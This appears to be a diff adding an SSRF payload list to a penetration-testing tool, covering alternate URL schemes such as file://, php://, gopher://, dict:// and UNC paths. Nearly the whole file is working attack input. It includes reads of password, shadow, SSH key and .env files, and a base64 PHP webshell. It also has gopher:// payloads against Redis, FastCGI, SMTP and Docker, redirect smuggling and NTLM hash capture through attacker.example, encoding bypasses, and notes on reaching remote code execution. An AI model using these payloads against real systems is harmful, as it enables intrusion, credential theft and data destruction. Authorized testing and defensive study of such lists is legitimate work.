@@ -1,0 +1,348 @@
+# ============================================================
+# BlackHunter — SSRF Payloads: Alternate Protocols / Schemes
+# ============================================================
+# Purpose : Test whether the backend URL handler accepts schemes
+#           beyond http/https (gopher, dict, file, ftp, ldap,
+#           tftp, jar, netdoc, etc.) and whether those schemes
+#           can be abused for file read, port scan, or RCE.
+# Use     : Authorized testing ONLY. See docs/ethical_guidelines.md
+# Format  : One payload per line. Lines starting with '#' are comments.
+# Warning : gopher:// can achieve RCE against internal services.
+#           Only use against targets explicitly in scope.
+# ============================================================
+
+# ------------------------------------------------------------
+# file:// — Local file read
+# ------------------------------------------------------------
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/hosts
+file:///etc/hostname
+file:///etc/resolv.conf
+file:///etc/crontab
+file:///etc/issue
+file:///etc/motd
+file:///etc/group
+file:///etc/sudoers
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///proc/self/status
+file:///proc/version
+file:///proc/net/tcp
+file:///proc/net/arp
+file:///proc/mounts
+file:///root/.ssh/id_rsa
+file:///root/.ssh/authorized_keys
+file:///home/<USER>/.ssh/id_rsa
+file:///var/log/apache2/access.log
+file:///var/log/nginx/access.log
+file:///var/log/auth.log
+file:///var/log/syslog
+file:///var/www/html/index.php
+file:///var/www/html/config.php
+file:///var/www/html/.env
+file:///srv/app/config.yml
+file:///app/.env
+
+# Windows
+file:///C:/Windows/win.ini
+file:///C:/Windows/System32/drivers/etc/hosts
+file:///C:/Windows/System32/config/SAM
+file:///C:/Windows/System32/config/SYSTEM
+file:///C:/Windows/repair/SAM
+file:///C:/Windows/win.ini
+file:///C:/boot.ini
+file:///C:/inetpub/wwwroot/web.config
+file:///C:/inetpub/logs/LogFiles/
+file:///C:/Users/Administrator/.ssh/id_rsa
+file:///C:/Users/Administrator/Desktop/
+file:///C:/xampp/apache/conf/httpd.conf
+file:///C:/xampp/htdocs/index.php
+file:///C:/xampp/passwords.txt
+
+# UNC paths (Windows SMB — forces outbound SMB, useful for
+# capturing NTLM hashes via Responder)
+file://///attacker.example/share
+file:////attacker.example/share
+\\\\attacker.example\\share
+
+# ------------------------------------------------------------
+# file:// — With wrappers (bypass basic blacklists)
+# ------------------------------------------------------------
+file://127.0.0.1/etc/passwd
+file://localhost/etc/passwd
+file:////etc/passwd
+file://///etc/passwd
+file:///etc/passwd%00
+file:///etc/passwd%00.png
+file:///etc/./passwd
+file:///etc//passwd
+file:///etc/passwd?
+file:///etc/passwd#
+FILE:///etc/passwd
+File:///etc/passwd
+
+# ------------------------------------------------------------
+# PHP wrappers (when backend is PHP and allow_url_include/fopen)
+# ------------------------------------------------------------
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode|convert.base64-encode/resource=index.php
+php://filter/string.strip_tags/resource=/etc/passwd
+php://input
+php://stdin
+php://stdout
+php://stderr
+php://memory
+php://temp
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+data://text/plain,<?php phpinfo(); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+expect://id
+expect://whoami
+expect://ls
+phar:///var/www/html/upload/archive.zip/shell.php
+phar://./archive.phar/x
+zip:///var/www/html/upload/archive.zip%23shell.php
+compress.zlib:///etc/passwd
+compress.bzip2:///etc/passwd
+glob:///etc/*
+ogg:///etc/passwd
+
+# ------------------------------------------------------------
+# gopher:// — The "make any TCP request" primitive
+# ------------------------------------------------------------
+# gopher://<host>:<port>/_<URL-encoded raw bytes>
+# %0D%0A = CRLF. The leading "_" is often required by curl.
+
+# --- Basic probe ---
+gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
+gopher://127.0.0.1:8080/_GET%20/%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
+
+# --- Redis (unauthenticated) ---
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_CONFIG%20GET%20dir
+gopher://127.0.0.1:6379/_CONFIG%20GET%20dbfilename
+gopher://127.0.0.1:6379/_KEYS%20*
+gopher://127.0.0.1:6379/_SET%20foo%20bar
+gopher://127.0.0.1:6379/_FLUSHALL
+# Redis → webshell (classic):
+# gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
+# gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php
+# gopher://127.0.0.1:6379/_SET%20x%20"<?php%20system($_GET['c']);%20?>"
+# gopher://127.0.0.1:6379/_SAVE
+
+# --- MySQL (fastcgi / auth bypass tricks) ---
+gopher://127.0.0.1:3306/_<binary>
+gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00
+
+# --- FastCGI / PHP-FPM (RCE via Gopherus-style payloads) ---
+gopher://127.0.0.1:9000/_<fastcgi-bytes>
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%04%00%0E%02CONTENT_LENGTH%F6%04%0E%04REQUEST_METHOD%POST...
+
+# --- Memcached ---
+gopher://127.0.0.1:11211/_stats
+gopher://127.0.0.1:11211/_stats%20items
+gopher://127.0.0.1:11211/_get%20foo
+gopher://127.0.0.1:11211/_set%20foo%200%200%205%0D%0Ahello%0D%0A
+gopher://127.0.0.1:11211/_version
+
+# --- SMTP (send mail as internal host) ---
+gopher://127.0.0.1:25/_HELO%20localhost%0D%0AMAIL%20FROM:<a@b.c>%0D%0ARCPT%20TO:<victim@target>%0D%0ADATA%0D%0ASubject:%20test%0D%0A%0D%0Ahello%0D%0A.%0D%0AQUIT%0D%0A
+
+# --- Elasticsearch ---
+gopher://127.0.0.1:9200/_GET%20/_cat/indices%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
+
+# --- Docker API ---
+gopher://127.0.0.1:2375/_GET%20/containers/json%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
+
+# --- Zabbix / Jolokia / other Java agents ---
+gopher://127.0.0.1:10050/_<zbx-bytes>
+gopher://127.0.0.1:8778/_<jolokia-bytes>
+
+# ------------------------------------------------------------
+# dict:// — Dictionary protocol (port scan + info leak)
+# ------------------------------------------------------------
+dict://127.0.0.1:11211/stat
+dict://127.0.0.1:11211/stats
+dict://127.0.0.1:11211/version
+dict://127.0.0.1:6379/INFO
+dict://127.0.0.1:6379/CONFIG
+dict://127.0.0.1:3306/
+dict://127.0.0.1:22/
+dict://127.0.0.1:25/
+dict://127.0.0.1:80/
+dict://target:port/
+dict://attacker.example:1337/ssrf-confirm
+
+# dict:// with credentials
+dict://user:pass@127.0.0.1:6379/INFO
+
+# ------------------------------------------------------------
+# ftp:// — FTP scheme abuse
+# ------------------------------------------------------------
+ftp://127.0.0.1/
+ftp://127.0.0.1:21/
+ftp://anonymous:anonymous@127.0.0.1/
+ftp://user:pass@127.0.0.1/
+ftp://attacker.example/
+ftp://attacker.example/pub/file.txt
+ftp://127.0.0.1/%2e%2e/%2e%2e/etc/passwd
+
+# ------------------------------------------------------------
+# ldap:// — LDAP scheme abuse
+# ------------------------------------------------------------
+ldap://127.0.0.1/
+ldap://127.0.0.1:389/
+ldap://127.0.0.1:636/
+ldap://127.0.0.1/dc=example,dc=com
+ldap://attacker.example/
+ldaps://127.0.0.1/
+ldapi://127.0.0.1/
+
+# ------------------------------------------------------------
+# tftp:// — Trivial FTP
+# ------------------------------------------------------------
+tftp://127.0.0.1/
+tftp://127.0.0.1:69/
+tftp://attacker.example/file
+tftp://127.0.0.1/etc/passwd
+
+# ------------------------------------------------------------
+# jar:// / netdoc:// — Java URL handler abuse
+# ------------------------------------------------------------
+jar:http://attacker.example/evil.jar!/
+jar:file:///etc/passwd!/
+jar:http://127.0.0.1:8080/app.jar!/
+netdoc:///etc/passwd
+netdoc://127.0.0.1/
+netdoc://attacker.example/
+
+# ------------------------------------------------------------
+# sftp:// / ssh:// / scp://
+# ------------------------------------------------------------
+sftp://127.0.0.1/
+sftp://user@127.0.0.1/
+ssh://127.0.0.1/
+scp://127.0.0.1/
+
+# ------------------------------------------------------------
+# smb:// / cifs:// — SMB (hash capture via Responder)
+# ------------------------------------------------------------
+smb://127.0.0.1/
+smb://attacker.example/share
+cifs://attacker.example/share
+//attacker.example/share
+
+# ------------------------------------------------------------
+# Other / niche schemes
+# ------------------------------------------------------------
+# rsync
+rsync://127.0.0.1/
+rsync://attacker.example/module
+
+# telnet
+telnet://127.0.0.1:23/
+
+# git
+git://127.0.0.1/
+git://attacker.example/repo.git
+
+# ws / wss — WebSocket (sometimes triggers upgrade)
+ws://127.0.0.1:8080/
+wss://127.0.0.1:8443/
+
+# mailto (rare, but some parsers resolve it)
+mailto:admin@127.0.0.1
+
+# data: and blob: (browser-side SSRF mostly)
+data:text/html,<script>fetch('http://169.254.169.254/latest/meta-data/')</script>
+blob:http://127.0.0.1/
+
+# ------------------------------------------------------------
+# Encoding / obfuscation variants
+# ------------------------------------------------------------
+# Mixed case
+GOPHER://127.0.0.1:6379/_INFO
+File:///etc/passwd
+FILE:///etc/passwd
+
+# URL-encoded scheme
+g%6f%70%68%65%72://127.0.0.1:6379/_INFO
+%67%6f%70%68%65%72://127.0.0.1:6379/_INFO
+
+# Whitespace / control chars before scheme
+ gopher://127.0.0.1:6379/_INFO
+%09gopher://127.0.0.1:6379/_INFO
+%00gopher://127.0.0.1:6379/_INFO
+%0agopher://127.0.0.1:6379/_INFO
+
+# Double-encoded
+gopher%3A%2F%2F127.0.0.1%3A6379%2F_INFO
+
+# Embedded in http (redirect chains)
+http://127.0.0.1/redirect?url=gopher://127.0.0.1:6379/_INFO
+http://127.0.0.1/redirect?url=file:///etc/passwd
+
+# @ trick
+http://expected.com@gopher://127.0.0.1:6379/_INFO
+
+# ------------------------------------------------------------
+# Protocol smuggling via redirects
+# ------------------------------------------------------------
+# These are used to chain an HTTP redirect into a non-HTTP scheme.
+# Many HTTP clients (curl, requests, urllib) will follow the
+# Location header even when it changes scheme — unless blocked.
+http://attacker.example/redir?to=gopher://127.0.0.1:6379/_INFO
+http://attacker.example/redir?to=file:///etc/passwd
+http://attacker.example/redir?to=dict://127.0.0.1:11211/stat
+http://attacker.example/redir?to=ftp://127.0.0.1/
+
+# ============================================================
+# Notes for testers
+# ============================================================
+# 1. Scheme support is entirely backend-dependent:
+#    - PHP + curl        : gopher, dict, file, ftp, ldap, tftp,
+#                          and any libcurl-supported scheme
+#    - Python requests   : http, https only (by default)
+#    - Python urllib     : http, https, ftp, file, data
+#    - Java URL          : http, https, ftp, file, jar, mailto,
+#                          netdoc
+#    - Node.js axios     : http, https only
+#    - Node.js fetch     : http, https only
+#    - Ruby open-uri     : http, https, ftp, file
+#    Enumerate what the target uses before spraying payloads.
+#
+# 2. gopher:// is the highest-impact scheme. It lets you craft
+#    arbitrary TCP payloads to internal services (Redis, MySQL,
+#    FastCGI, Memcached, Docker, etc.) and is the standard path
+#    from SSRF to RCE. Use it only in scope.
+#
+# 3. file:// is the fastest way to confirm SSRF + LFI. If it
+#    works, /etc/passwd or C:\Windows\win.ini will render.
+#
+# 4. dict:// is a low-noise way to confirm SSRF and port-scan
+#    internal services (returns banner data for many protocols).
+#
+# 5. UNC paths (file://///host/share) can capture NTLM hashes
+#    via Responder — useful for Windows targets.
+#
+# 6. data:// and php://input can turn SSRF into RCE on PHP
+#    targets with allow_url_include=On.
+#
+# 7. Redirect-based smuggling is often missed by filters that
+#    only validate the user-supplied URL, not the final URL
+#    after following redirects.
+#
+# 8. Always confirm with out-of-band (interactsh, Collaborator)
+#    before assuming a blind SSRF worked. Some schemes return
+#    no response data but still make the connection.
+#
+# 9. Never use gopher:// to modify, delete, or exfiltrate data
+#    from an internal service unless the RoE explicitly allows
+#    it. A read-only probe is usually enough to prove impact.
+# ============================================================
